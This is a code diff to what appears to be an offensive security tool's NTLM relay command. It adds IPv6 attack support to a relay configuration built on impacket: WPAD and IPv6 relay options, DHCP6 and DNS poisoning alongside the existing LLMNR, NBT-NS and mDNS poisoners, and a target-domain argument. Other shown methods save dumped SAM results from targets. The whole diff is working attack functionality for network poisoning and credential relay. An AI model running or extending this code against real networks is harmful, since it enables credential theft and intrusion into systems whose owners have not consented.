@@ -163,7 +163,7 @@ class NtlmRelay(CommandSet):
             self.__ntlm_relay_process.terminate()
             self.__ntlm_relay_process.join()
             self.__ntlm_relay_process = None
-            self._cmd.error_logger.warning("Exiting smb relay attack ...")
+            self._cmd.error_logger.warning("Exiting ntlm relay attack ...")
 
     def __configure_ntlm_relay_attack(self, args: argparse.Namespace) -> None:
         """[ Method to configure the class NTLMRelayxConfig
@@ -176,14 +176,19 @@ class NtlmRelay(CommandSet):
             protocolClients=self.__clients,
         )
         self.__config = NTLMRelayxConfig()
+        if args.ipv6:
 
+            self.__config.setWpadOptions(self._cmd.LHOST, 1)
+            self.__config.setIPv6(True)
+
+            self.__config.setInterfaceIp("")
+        else:
+            self.__config.setInterfaceIp(self._cmd.LHOST)
         self.__config.setMode("RELAY")
-        self.__config.target = target
+        self.__config.setTargets(target)
         self.__config.setAttacks(self.__attacks)
         self.__config.setProtocolClients(self.__clients)
         self.__config.setSMB2Support(True)
-        self.__config.interfaceIp = self._cmd.LHOST
-        self.__config.setIPv6(args.ipv6)
 
     def __store_sam_results_of_target(self) -> None:
         """[method to save the attack output to a file]"""
@@ -270,13 +275,22 @@ class NtlmRelay(CommandSet):
 
     def __poison_configuration(self, args: argparse.Namespace) -> dict:
 
-        poison_selector = {"MDNS": 0, "NBT_NS": 0, "LLMNR": 0, "DHCP6": 0}
+        poison_selector = {"MDNS": 0, "NBT_NS": 0, "LLMNR": 0, "DHCP6": 0, "DNS": 0}
         if args.mdns:
             poison_selector["MDNS"] = 1
         if args.nbt_ns:
             poison_selector["NBT_NS"] = 1
         if args.llmnr:
             poison_selector["LLMNR"] = 1
+        if args.ipv6:
+            if args.domain != "":
+                poison_selector["DHCP6"] = 1
+                poison_selector["DNS"] = 1
+            else:
+                self._cmd.error_logger.error(
+                    "Enter the target domain to activate the dhcp6 poisoner"
+                )
+
         return poison_selector
 
     def __creating_components(self, args: argparse.Namespace) -> None:
@@ -295,6 +309,7 @@ class NtlmRelay(CommandSet):
             self._cmd.info_logger,
             args.Asynchronous,
             poison_selector,
+            args.domain,
         )
 
         self.__configure_ntlm_relay_attack(args)
@@ -441,6 +456,15 @@ class NtlmRelay(CommandSet):
         "--ipv6",
         action="store_true",
         help="To attack with ipv6",
+    )
+
+    attack_options.add_argument(
+        "-DOM",
+        "--domain",
+        action="store",
+        type=str,
+        required=False,
+        help="Target domain",
     )
 
     @with_argparser(argParser)
